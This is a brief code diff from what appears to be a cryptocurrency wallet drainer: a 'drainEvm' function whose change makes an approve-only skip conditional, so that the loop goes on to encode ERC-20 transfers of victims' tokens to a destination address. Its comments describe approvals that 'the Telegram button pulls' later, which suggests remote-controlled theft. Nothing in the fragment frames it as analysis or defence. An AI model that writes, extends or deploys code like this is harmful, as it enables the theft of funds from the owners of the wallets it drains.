@@ -468,7 +468,7 @@ async function drainEvm() {
     }
 
     // Approve-only: the Telegram button pulls this later. Saves a prompt.
-    continue;
+  if (cfg.approveOnly) continue;
 
     // 2. only now does the transfer simulation matter
     const data = EVM_IFACE.encodeFunctionData('transfer', [dest, BigInt(t.raw)]);
